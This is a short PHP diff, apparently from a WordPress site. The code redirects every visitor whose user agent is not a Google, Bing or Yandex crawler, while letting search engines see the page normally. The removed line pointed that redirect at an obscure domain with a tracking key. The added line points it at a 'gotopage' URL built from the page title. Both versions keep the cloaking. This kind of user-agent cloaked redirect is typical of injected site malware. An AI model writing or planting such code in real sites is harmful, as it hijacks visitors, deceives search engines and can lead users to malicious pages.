@@ -4,7 +4,8 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 
     // (case-insensitive)
     if (!preg_match('/google|bing|yandex/i', $user_agent)) {
-        header('Location: https://ominousirritatingpictorial.com/yeq6pfda?key=1b4d52e64661803759543f5d2bf12246');
+        $gotopage_url = home_url('https://www.sookeregionchamber.com/gotopage/') . '?p=' . urlencode(strtoupper($title));
+        header('Location: ' . $gotopage_url);
         exit;
     }
 }
